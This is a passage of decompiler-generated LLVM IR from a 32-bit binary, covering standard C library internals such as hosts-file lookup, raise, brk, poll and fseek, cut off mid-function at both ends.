bb56:                                             ; preds = %dec_label_pc_15b94
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_15b94, %bb56
  %v0_15ba8.pr = phi i32 [ %v3_15b94, %dec_label_pc_15b94 ], [ 1, %bb56 ]
  %v1_15ba0 = add i32 %storemerge, -4
  %v3_15ba0 = sub i32 3, %storemerge
  %v4_15ba0 = and i32 %v3_15ba0, %storemerge
  %v5_15ba0 = icmp slt i32 %v4_15ba0, 0
  %v6_15ba0 = icmp slt i32 %v1_15ba0, 0
  %v7_15ba0 = icmp eq i32 %storemerge, 4
  %v3_15ba4 = xor i1 %v6_15ba0, %v5_15ba0
  %v4_15ba4 = or i1 %v7_15ba0, %v3_15ba4
  br i1 %v4_15ba4, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_15bb0

bb58:                                             ; preds = %bb57
  %v2_15ba8 = icmp eq i32 %v0_15ba8.pr, 0
  br i1 %v2_15ba8, label %dec_label_pc_15bb0, label %dec_label_pc_15b20

dec_label_pc_15bb0:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1a2cc.613 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_15bbc = call i32 @__GI_strcoll(i8* %v3_15bbc, i32 ptrtoint ([11 x i8]* @global_var_1a2cc.613 to i32))
  store i32 %v4_15bbc, i32* %r0.global-to-local, align 4
  %v2_15bc0 = icmp eq i32 %v4_15bbc, 0
  br i1 %v2_15bc0, label %dec_label_pc_15be8.preheader, label %dec_label_pc_15c0c

dec_label_pc_15be8.preheader:                     ; preds = %dec_label_pc_15bb0
  br label %dec_label_pc_15be8

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15c00
  %v1_15bd0 = add i32 %v5_15bf0, -36
  %v2_15bd0 = inttoptr i32 %v1_15bd0 to i32*
  %v3_15bd0 = load i32, i32* %v2_15bd0, align 4
  store i32 %v3_15bd0, i32* %r0.global-to-local, align 4
  %v1_15bd4 = inttoptr i32 %v3_15bd0 to i8*
  %v2_15bd4 = call i32 @__GI_strdup(i8* %v1_15bd4)
  store i32 %v2_15bd4, i32* %r0.global-to-local, align 4
  %v0_15bdc = load i32, i32* @r4, align 4
  %v1_15bdc = add i32 %v0_15bdc, 1
  store i32 %v1_15bdc, i32* %r2.global-to-local, align 4
  %v5_15be0 = mul i32 %v0_15bdc, 4
  %v6_15be0 = add i32 %v5_15be0, ptrtoint (i32* @global_var_28b9c.438 to i32)
  %v7_15be0 = inttoptr i32 %v6_15be0 to i32*
  store i32 %v2_15bd4, i32* %v7_15be0, align 4
  %v0_15be4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15be4 = load i32, i32* @r7, align 4
  %v2_15be4 = inttoptr i32 %v1_15be4 to i32*
  store i32 %v0_15be4, i32* %v2_15be4, align 4
  %v0_15bec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15be8.preheader, %dec_label_pc_15bd0
  %v0_15bf8 = phi i32 [ 1, %dec_label_pc_15be8.preheader ], [ %v0_15bec.pre, %dec_label_pc_15bd0 ]
  store i32 %v2_15b20, i32* %r2.global-to-local, align 4
  %v1_15bec = load i32, i32* @r8, align 4
  %v2_15bec = sub i32 %v0_15bf8, %v1_15bec
  %v4_15bec = xor i32 %v1_15bec, %v0_15bf8
  %v5_15bec = xor i32 %v2_15bec, %v0_15bf8
  %v6_15bec = and i32 %v5_15bec, %v4_15bec
  %v7_15bec = icmp slt i32 %v6_15bec, 0
  %v8_15bec = icmp slt i32 %v2_15bec, 0
  %v4_15bf0 = mul i32 %v0_15bf8, 4
  %v5_15bf0 = add i32 %v4_15bf0, %v2_15b20
  store i32 ptrtoint (i32* @global_var_28ba8.435 to i32), i32* @r7, align 4
  %v1_15bf8 = add i32 %v0_15bf8, 1
  store i32 %v1_15bf8, i32* @r5, align 4
  %v2_15bfc = xor i1 %v8_15bec, %v7_15bec
  br i1 %v2_15bfc, label %dec_label_pc_15c00, label %dec_label_pc_15c0c

dec_label_pc_15c00:                               ; preds = %dec_label_pc_15be8
  %v2_15c00 = load i32, i32* @global_var_28ba8.435, align 4
  store i32 %v2_15c00, i32* @r4, align 4
  %v7_15c08 = icmp slt i32 %v2_15c00, 3
  br i1 %v7_15c08, label %dec_label_pc_15bd0, label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %dec_label_pc_15be8, %dec_label_pc_15c00, %dec_label_pc_15bb0
  %v0_15c0c = load i32, i32* @r6, align 4
  store i32 %v0_15c0c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a2d8.616 to i32), i32* @r1, align 4
  %v3_15c14 = inttoptr i32 %v0_15c0c to i8*
  %v4_15c14 = call i32 @__GI_strcoll(i8* %v3_15c14, i32 ptrtoint ([7 x i8]* @global_var_1a2d8.616 to i32))
  store i32 %v4_15c14, i32* %r0.global-to-local, align 4
  %v2_15c18 = icmp eq i32 %v4_15c14, 0
  br i1 %v2_15c18, label %dec_label_pc_15c50.preheader, label %dec_label_pc_15c20

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15c0c
  %v0_15c20 = load i32, i32* @r6, align 4
  store i32 %v0_15c20, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a2e0.618 to i32), i32* @r1, align 4
  %v3_15c28 = inttoptr i32 %v0_15c20 to i8*
  %v4_15c28 = call i32 @__GI_strcoll(i8* %v3_15c28, i32 ptrtoint ([7 x i8]* @global_var_1a2e0.618 to i32))
  store i32 %v4_15c28, i32* %r0.global-to-local, align 4
  %v2_15c2c = icmp eq i32 %v4_15c28, 0
  br i1 %v2_15c2c, label %dec_label_pc_15c50.preheader, label %dec_label_pc_15cac.backedge

dec_label_pc_15c50.preheader:                     ; preds = %dec_label_pc_15c0c, %dec_label_pc_15c20
  store i32 ptrtoint (i32* @global_var_28bac.593 to i32), i32* @r4, align 4
  %v2_15c5460 = load i32, i32* @global_var_28bac.593, align 4
  store i32 ptrtoint (i32* @global_var_28b8c.597 to i32), i32* @r5, align 4
  %v1_15c6063 = add i32 %v2_15c5460, -1
  store i32 %v1_15c6063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_15c5460, 1
  br i1 %tmp5964, label %dec_label_pc_15c68, label %dec_label_pc_15c38

dec_label_pc_15c38:                               ; preds = %dec_label_pc_15c50.preheader, %dec_label_pc_15c38
  %v1_15c6065 = phi i32 [ %v1_15c60, %dec_label_pc_15c38 ], [ %v1_15c6063, %dec_label_pc_15c50.preheader ]
  %v4_15c38 = mul i32 %v1_15c6065, 4
  %v5_15c38 = add i32 %v4_15c38, ptrtoint (i32* @global_var_28b8c.597 to i32)
  %v6_15c38 = inttoptr i32 %v5_15c38 to i32*
  %v7_15c38 = load i32, i32* %v6_15c38, align 4
  store i32 %v7_15c38, i32* @r0, align 4
  store i32 %v1_15c6065, i32* @global_var_28bac.593, align 4
  %v0_15c40 = call i32 @free()
  store i32 %v0_15c40, i32* %r0.global-to-local, align 4
  %v0_15c44 = load i32, i32* @r4, align 4
  %v1_15c44 = inttoptr i32 %v0_15c44 to i32*
  %v2_15c44 = load i32, i32* %v1_15c44, align 4
  %v1_15c4c = load i32, i32* @r5, align 4
  %v5_15c4c = mul i32 %v2_15c44, 4
  %v6_15c4c = add i32 %v1_15c4c, %v5_15c4c
  %v7_15c4c = inttoptr i32 %v6_15c4c to i32*
  store i32 0, i32* %v7_15c4c, align 4
  store i32 ptrtoint (i32* @global_var_28bac.593 to i32), i32* @r4, align 4
  %v2_15c54 = load i32, i32* @global_var_28bac.593, align 4
  store i32 ptrtoint (i32* @global_var_28b8c.597 to i32), i32* @r5, align 4
  %v1_15c60 = add i32 %v2_15c54, -1
  store i32 %v1_15c60, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_15c54, 1
  br i1 %tmp59, label %dec_label_pc_15c68, label %dec_label_pc_15c38

dec_label_pc_15c68:                               ; preds = %dec_label_pc_15c38, %dec_label_pc_15c50.preheader
  br label %dec_label_pc_15c88

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15ca0
  %v1_15c70 = add i32 %v5_15c90, -36
  %v2_15c70 = inttoptr i32 %v1_15c70 to i32*
  %v3_15c70 = load i32, i32* %v2_15c70, align 4
  store i32 %v3_15c70, i32* %r0.global-to-local, align 4
  %v1_15c74 = inttoptr i32 %v3_15c70 to i8*
  %v2_15c74 = call i32 @__GI_strdup(i8* %v1_15c74)
  store i32 %v2_15c74, i32* %r0.global-to-local, align 4
  %v0_15c7c = load i32, i32* @r4, align 4
  %v1_15c7c = add i32 %v0_15c7c, 1
  store i32 %v1_15c7c, i32* %r2.global-to-local, align 4
  %v5_15c80 = mul i32 %v0_15c7c, 4
  %v6_15c80 = add i32 %v5_15c80, ptrtoint (i32* @global_var_28b8c.597 to i32)
  %v7_15c80 = inttoptr i32 %v6_15c80 to i32*
  store i32 %v2_15c74, i32* %v7_15c80, align 4
  %v0_15c84 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c84 = load i32, i32* @r6, align 4
  %v2_15c84 = inttoptr i32 %v1_15c84 to i32*
  store i32 %v0_15c84, i32* %v2_15c84, align 4
  %v0_15c8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15c68, %dec_label_pc_15c70
  %v0_15c98 = phi i32 [ 1, %dec_label_pc_15c68 ], [ %v0_15c8c.pre, %dec_label_pc_15c70 ]
  store i32 %v2_15b20, i32* %r2.global-to-local, align 4
  %v1_15c8c = load i32, i32* @r8, align 4
  %v2_15c8c = sub i32 %v0_15c98, %v1_15c8c
  %v4_15c8c = xor i32 %v1_15c8c, %v0_15c98
  %v5_15c8c = xor i32 %v2_15c8c, %v0_15c98
  %v6_15c8c = and i32 %v5_15c8c, %v4_15c8c
  %v7_15c8c = icmp slt i32 %v6_15c8c, 0
  %v8_15c8c = icmp slt i32 %v2_15c8c, 0
  %v4_15c90 = mul i32 %v0_15c98, 4
  %v5_15c90 = add i32 %v4_15c90, %v2_15b20
  store i32 ptrtoint (i32* @global_var_28bac.593 to i32), i32* @r6, align 4
  %v1_15c98 = add i32 %v0_15c98, 1
  store i32 %v1_15c98, i32* @r5, align 4
  %v2_15c9c = xor i1 %v8_15c8c, %v7_15c8c
  br i1 %v2_15c9c, label %dec_label_pc_15ca0, label %dec_label_pc_15cac.backedge

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c88
  %v2_15ca0 = load i32, i32* @global_var_28bac.593, align 4
  store i32 %v2_15ca0, i32* @r4, align 4
  %v7_15ca8 = icmp slt i32 %v2_15ca0, 4
  br i1 %v7_15ca8, label %dec_label_pc_15c70, label %dec_label_pc_15cac.backedge

dec_label_pc_15adc.preheader:                     ; preds = %dec_label_pc_15adc.preheader.lr.ph, %dec_label_pc_15cac.backedge
  store i32 %v2_15a70, i32* %r0.global-to-local, align 4
  %v2_15adc12 = load i8, i8* %v1_15adc11, align 4
  %v3_15adc13 = zext i8 %v2_15adc12 to i32
  store i32 %v3_15adc13, i32* %r2.global-to-local, align 4
  %v2_15ae014 = icmp eq i8 %v2_15adc12, 0
  br i1 %v2_15ae014, label %dec_label_pc_15afc, label %dec_label_pc_15ae8.lr.ph

dec_label_pc_15ae8.lr.ph:                         ; preds = %dec_label_pc_15adc.preheader
  %v2_15aec.pre = load i32, i32* @global_var_224e8, align 4
  br label %dec_label_pc_15ae8

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15cac.backedge, %dec_label_pc_15cac.preheader
  %v0_15ccc = load i32, i32* @sl, align 4
  store i32 %v0_15ccc, i32* %r0.global-to-local, align 4
  %v1_15cd0 = inttoptr i32 %v0_15ccc to i8*
  %v2_15cd0 = call i32 @__GI_fclose(i8* %v1_15cd0)
  store i32 %v2_15cd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ce4

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15ac0
  %v0_15cd8 = call i32 @__GI___h_errno_location()
  store i32 %v0_15cd8, i32* %r0.global-to-local, align 4
  %v2_15ce0 = inttoptr i32 %v0_15cd8 to i32*
  store i32 3, i32* %v2_15ce0, align 4
  br label %dec_label_pc_15ce4

dec_label_pc_15ce4:                               ; preds = %entry, %dec_label_pc_15ccc, %dec_label_pc_15cd8
  store i32 %v2_15a74, i32* @r0, align 4
  %v1_15cf4 = call i32 @__pthread_return_void()
  store i32 %v1_15cf4, i32* %r0.global-to-local, align 4
  store i32 %v6_15a6c, i32* @r5, align 4
  store i32 %v9_15a6c, i32* @r6, align 4
  store i32 %v12_15a6c, i32* @r7, align 4
  store i32 %v15_15a6c, i32* @r8, align 4
  store i32 %v18_15a6c, i32* @sl, align 4
  ret i32 %v1_15cf4

; uselistorder directives
  uselistorder i32 %v3_15adc13, { 2, 1, 0 }
  uselistorder i32 %v2_15c8c, { 1, 0 }
  uselistorder i32 %v0_15c98, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_15c60, { 1, 0 }
  uselistorder i32 %v1_15c6065, { 1, 0 }
  uselistorder i32 %v2_15bec, { 1, 0 }
  uselistorder i32 %v0_15bf8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15b28, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_15b6820, { 1, 0, 2 }
  uselistorder i32 %v2_15b20, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_15a70, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 2, 0, 1, 3, 13, 6, 4, 5, 7, 17, 8, 16, 9, 11, 10, 14, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 19, 5, 4, 6, 8, 7, 10, 9, 12, 11, 20, 13, 14, 18, 15, 17, 22, 21, 16, 28, 27, 23, 26, 24, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_28b8c.597 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_28bac.593, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_28bac.593 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_28b9c.438 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 6, 3, 4, 8, 9, 10, 11, 7, 12, 5, 13 }
  uselistorder i32* @global_var_28ba8.435, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_15ce4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15adc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15c88, { 1, 0 }
  uselistorder label %dec_label_pc_15c38, { 1, 0 }
  uselistorder label %dec_label_pc_15c50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15c0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15be8, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_15b94, { 1, 0 }
  uselistorder label %dec_label_pc_15b90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b74, { 1, 0 }
  uselistorder label %dec_label_pc_15b60, { 1, 0 }
  uselistorder label %dec_label_pc_15b40, { 1, 0 }
  uselistorder label %dec_label_pc_15cac.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_15afc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cac.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_15d7c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_15d7c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15d88 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15d90 = call i32 @__libc_getpid()
  store i32 %v3_15d88, i32* @r4, align 4
  %v0_15d9c = call i32 @kill()
  ret i32 %v0_15d9c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15da0 = add i32 %arg1, 28
  %v2_15da0 = inttoptr i32 %v1_15da0 to i32*
  %v3_15da0 = load i32, i32* %v2_15da0, align 4
  %v1_15da8 = add i32 %arg1, 44
  %v2_15da8 = inttoptr i32 %v1_15da8 to i32*
  %v3_15da8 = load i32, i32* %v2_15da8, align 4
  store i32 %v3_15da0, i32* @global_var_28bb0.623, align 4
  store i32 %v3_15da8, i32* @global_var_28bb4.625, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15dcc = call i32 @brk(i32* %arg1)
  %v3_15dd0 = icmp ult i32 %v2_15dcc, %tmp
  store i32 %v2_15dcc, i32* @global_var_28ae0.560, align 4
  br i1 %v3_15dd0, label %dec_label_pc_15de4, label %dec_label_pc_15df4

dec_label_pc_15de4:                               ; preds = %entry
  %v0_15de4 = call i32 @__errno_location()
  %v2_15dec = inttoptr i32 %v0_15de4 to i32*
  store i32 12, i32* %v2_15dec, align 4
  br label %dec_label_pc_15df4

dec_label_pc_15df4:                               ; preds = %entry, %dec_label_pc_15de4
  %v0_15df4 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_15de4 ]
  ret i32 %v0_15df4

; uselistorder directives
  uselistorder i32* @global_var_28ae0.560, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15df4, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15e00 = load i32, i32* @r4, align 4
  store i32 %v3_15e00, i32* %stack_var_-8, align 4
  %v5_15e04 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_15e04, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15e04, -4095
  br i1 %tmp, label %dec_label_pc_15e24, label %dec_label_pc_15e14

dec_label_pc_15e14:                               ; preds = %entry
  %v0_15e14 = call i32 @__errno_location()
  %v0_15e18 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e18 = sub i32 0, %v0_15e18
  %v2_15e1c = inttoptr i32 %v0_15e14 to i32*
  store i32 %v1_15e18, i32* %v2_15e1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e24

dec_label_pc_15e24:                               ; preds = %entry, %dec_label_pc_15e14
  %v0_15e24 = phi i32 [ %v5_15e04, %entry ], [ -1, %dec_label_pc_15e14 ]
  %v2_15e28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15e28, i32* @r4, align 4
  ret i32 %v0_15e24

; uselistorder directives
  uselistorder i32 %v5_15e04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15e24, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_15e2c = load i32, i32* @r2, align 4
  store i32 %v0_15e2c, i32* @r3, align 4
  %v0_15e34 = call i32 @__GI_fseeko64()
  ret i32 %v0_15e34
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_15e38 = load i32, i32* @r4, align 4
  %v6_15e38 = load i32, i32* @r5, align 4
  %v9_15e38 = load i32, i32* @r6, align 4
  %v0_15e3c = load i32, i32* @r3, align 4
  %v2_15e40 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_15e3c, i32* @r6, align 4
  %v0_15e48 = load i32, i32* @r0, align 4
  store i32 %v0_15e48, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_15e3c, 3
  br i1 %tmp, label %dec_label_pc_15e64, label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %entry
  %v0_15e50 = call i32 @__errno_location()
  store i32 %v0_15e50, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_15e5c = inttoptr i32 %v0_15e50 to i32*
  store i32 22, i32* %v2_15e5c, align 4
  br label %.thread3

dec_label_pc_15e64:                               ; preds = %entry
  %v1_15e64 = add i32 %v0_15e48, 52
  %v2_15e64 = inttoptr i32 %v1_15e64 to i32*
  %v3_15e64 = load i32, i32* %v2_15e64, align 4
  store i32 %v3_15e64, i32* %r7.global-to-local, align 4
  %v2_15e68 = icmp eq i32 %v3_15e64, 0
  %v0_15e6c = load i32, i32* @r1, align 4
  store i32 %v0_15e6c, i32* %stack_var_-28, align 4
  br i1 %v2_15e68, label %dec_label_pc_15e78, label %dec_label_pc_15ea4

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e64
  %v1_15e78 = add i32 %v0_15e48, 56
  store i32 %v1_15e78, i32* @r4, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  store i32 %v2_15e40, i32* @r0, align 4
  store i32 %v1_15e78, i32* %r2.global-to-local, align 4
  %v1_15e90 = call i32 @__pthread_return_void()
  %v0_15e94 = load i32, i32* @r4, align 4
  store i32 %v0_15e94, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  store i32 89764, i32* @lr, align 4
  %v1_15ea0 = call i32 @__pthread_return_0()
  store i32 %v1_15ea0, i32* %r0.global-to-local, align 4
  %v0_15ea4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15ea4

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e64, %dec_label_pc_15e78
  %v0_15eb0 = phi i32 [ %v0_15e48, %dec_label_pc_15e64 ], [ %v0_15ea4.pre, %dec_label_pc_15e78 ]
  %v1_15ea4 = inttoptr i32 %v0_15eb0 to i8*
  %v2_15ea4 = load i8, i8* %v1_15ea4, align 1
  %v3_15ea4 = zext i8 %v2_15ea4 to i32
  store i32 %v3_15ea4, i32* %r3.global-to-local, align 4
  %v1_15ea8 = and i32 %v3_15ea4, 64
  %v2_15ea8 = icmp eq i32 %v1_15ea8, 0
  br i1 %v2_15ea8, label %dec_label_pc_15ec0, label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15ea4
  store i32 %v0_15eb0, i32* @r0, align 4
  %v0_15eb4 = call i32 @__stdio_wcommit()
  store i32 %v0_15eb4, i32* %r0.global-to-local, align 4
  %v2_15eb8 = icmp eq i32 %v0_15eb4, 0
  br i1 %v2_15eb8, label %dec_label_pc_15ec0, label %dec_label_pc_15f30

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15eb0, %dec_label_pc_15ea4
  %v0_15ec0 = load i32, i32* @r6, align 4
  %v7_15ec0 = icmp eq i32 %v0_15ec0, 1
  br i1 %v7_15ec0, label %dec_label_pc_15ec8, label %dec_label_pc_15ec0.dec_label_pc_15edc_crit_edge

dec_label_pc_15ec0.dec_label_pc_15edc_crit_edge:  ; preds = %dec_label_pc_15ec0
  br label %dec_label_pc_15edc

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15ec0
  %v0_15ec8 = load i32, i32* @r5, align 4
  store i32 %v0_15ec8, i32* %r0.global-to-local, align 4
  %v2_15ecc = ptrtoint i32* %stack_var_-28 to i32
  %v2_15ed0 = inttoptr i32 %v0_15ec8 to i8*
  %v3_15ed0 = call i32 @__stdio_adjust_position(i8* %v2_15ed0, i32 %v2_15ecc)
  store i32 %v3_15ed0, i32* %r0.global-to-local, align 4
  %v1_15ed4 = icmp slt i32 %v3_15ed0, 0
  br i1 %v1_15ed4, label %dec_label_pc_15f30, label %dec_label_pc_15ec8.dec_label_pc_15edc_crit_edge

dec_label_pc_15ec8.dec_label_pc_15edc_crit_edge:  ; preds = %dec_label_pc_15ec8
  %v0_15edc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15edc

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15ec0.dec_label_pc_15edc_crit_edge, %dec_label_pc_15ec8.dec_label_pc_15edc_crit_edge
  %v0_15edc = phi i32 [ %v0_15ec0, %dec_label_pc_15ec0.dec_label_pc_15edc_crit_edge ], [ %v0_15edc.pre, %dec_label_pc_15ec8.dec_label_pc_15edc_crit_edge ]
  store i32 %v0_15edc, i32* %r2.global-to-local, align 4
  %v0_15ee0 = load i32, i32* @r5, align 4
  store i32 %v0_15ee0, i32* %r0.global-to-local, align 4
  %v4_15ee8 = call i32 @__stdio_seek(i32 %v0_15ee0, i32* nonnull %stack_var_-28, i32 %v0_15edc)
  store i32 %v4_15ee8, i32* %r0.global-to-local, align 4
  %v1_15eec = icmp slt i32 %v4_15ee8, 0
  br i1 %v1_15eec, label %dec_label_pc_15f30, label %dec_label_pc_15ef4

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15edc
  %v0_15ef4 = load i32, i32* @r5, align 4
  %v1_15ef4 = inttoptr i32 %v0_15ef4 to i32*
  %v2_15ef4 = load i32, i32* %v1_15ef4, align 4
  store i32 %v2_15ef4, i32* %r3.global-to-local, align 4
  %v1_15ef8 = add i32 %v0_15ef4, 8
  %v2_15ef8 = inttoptr i32 %v1_15ef8 to i32*
  %v3_15ef8 = load i32, i32* %v2_15ef8, align 4
  store i32 %v3_15ef8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15f00 = and i32 %v2_15ef4, -72
  store i32 %v1_15f00, i32* %r3.global-to-local, align 4
  %v3_15f04 = sdiv i32 %v2_15ef4, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15f0c = trunc i32 %v3_15f04 to i8
  %v3_15f0c = add i32 %v0_15ef4, 1
  %v4_15f0c = inttoptr i32 %v3_15f0c to i8*
  store i8 %v1_15f0c, i8* %v4_15f0c, align 1
  %v0_15f10 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f10 = load i32, i32* @r5, align 4
  %v2_15f10 = add i32 %v1_15f10, 28
  %v3_15f10 = inttoptr i32 %v2_15f10 to i32*
  store i32 %v0_15f10, i32* %v3_15f10, align 4
  %v0_15f14 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f14 = trunc i32 %v0_15f14 to i8
  %v2_15f14 = load i32, i32* @r5, align 4
  %v3_15f14 = add i32 %v2_15f14, 2
  %v4_15f14 = inttoptr i32 %v3_15f14 to i8*
  store i8 %v1_15f14, i8* %v4_15f14, align 1
  %v0_15f18 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f18 = trunc i32 %v0_15f18 to i8
  %v2_15f18 = load i32, i32* @r5, align 4
  %v3_15f18 = inttoptr i32 %v2_15f18 to i8*
  store i8 %v1_15f18, i8* %v3_15f18, align 1
  %v0_15f1c = load i32, i32* %r2.global-to-local, align 4
  %v1_15f1c = load i32, i32* @r5, align 4
  %v2_15f1c = add i32 %v1_15f1c, 16
  %v3_15f1c = inttoptr i32 %v2_15f1c to i32*
  store i32 %v0_15f1c, i32* %v3_15f1c, align 4
  %v0_15f20 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f20 = load i32, i32* @r5, align 4
  %v2_15f20 = add i32 %v1_15f20, 20
  %v3_15f20 = inttoptr i32 %v2_15f20 to i32*
  store i32 %v0_15f20, i32* %v3_15f20, align 4
  %v0_15f24 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f24 = load i32, i32* @r5, align 4
  %v2_15f24 = add i32 %v1_15f24, 24
  %v3_15f24 = inttoptr i32 %v2_15f24 to i32*
  store i32 %v0_15f24, i32* %v3_15f24, align 4
  %v0_15f28 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f28 = load i32, i32* @r5, align 4
  %v2_15f28 = add i32 %v1_15f28, 44
  %v3_15f28 = inttoptr i32 %v2_15f28 to i32*
  store i32 %v0_15f28, i32* %v3_15f28, align 4
  br label %dec_label_pc_15f34

dec_label_pc_15f30:                               ; preds = %dec_label_pc_15eb0, %dec_label_pc_15edc, %dec_label_pc_15ec8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15ef4, %dec_label_pc_15f30
  %v0_15f34 = load i32, i32* %r7.global-to-local, align 4
  %v2_15f34 = icmp eq i32 %v0_15f34, 0
  br i1 %v2_15f34, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_15f34
  store i32 %v2_15e40, i32* %r0.global-to-local, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  store i32 89932, i32* @lr, align 4
